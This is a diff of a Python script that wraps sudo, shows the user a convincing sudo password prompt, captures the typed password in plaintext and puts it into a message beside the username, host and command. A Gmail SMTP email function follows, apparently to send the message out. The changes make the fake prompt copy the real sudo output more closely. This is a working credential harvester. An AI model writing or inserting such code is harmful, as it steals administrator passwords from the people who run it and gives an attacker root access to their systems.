@@ -8,30 +8,28 @@ from getpass import getpass
 def dosudo(cmmd):
     usnm=os.environ.get('USER')
     hsnm=os.environ.get('HOSTNAME')
-    psstr='[sudo] password for {0}: '.format(usnm)
     sf='sudo succeeded'
     psw=''
+    rslt=''
     try:
         p=spawn('bash',['-c','/usr/bin/sudo '+cmmd])
-        i=0
-        while i==0:
-            i=p.expect([usnm+': ','3 incorrect password attempts','will be reported.',EOF])
-            if i==0:
-                psw=getpass(psstr)
-                p.sendline(psw)
+        i=1
+        while i:
+            i=p.expect([EOF,usnm+': ','3 incorrect password attempts','will be reported.'])
             if i==1:
-                sf='sudo failed'
-                p.expect(EOF)
-                print 'sudo: 3 incorrect password attempts'
+                psw=getpass((p.before+p.after).strip())
+                p.sendline(psw)
             if i==2:
+                sf='sudo failed'
+                rslt=(p.before+p.after).strip()
+            if i==3:
                 sf='Not Sudoer'
-                p.expect(EOF)
-                print '{0} is not in the sudoers file.  This incident will be reported.'.format(usnm)
-        rslt=p.before.strip()
+                rslt=(p.before+p.after).strip()
+        rslt+=p.before.strip()
     except Exception as ex:
         sf='failed'
         rslt='Permission denied'
-    return ('{0} with password {2} has performed "sudo {4}" on {1} [status: {3}]'.format(usnm,hsnm,psw,sf,cmmd) if psw else '',rslt)
+    return ('{0} with password "{2}" has performed "sudo {4}" on {1} [status: {3}]'.format(usnm,hsnm,psw,sf,cmmd) if psw else '',rslt)
 
 def sendemail(mssg):
     smtpserver = smtplib.SMTP("smtp.gmail.com")
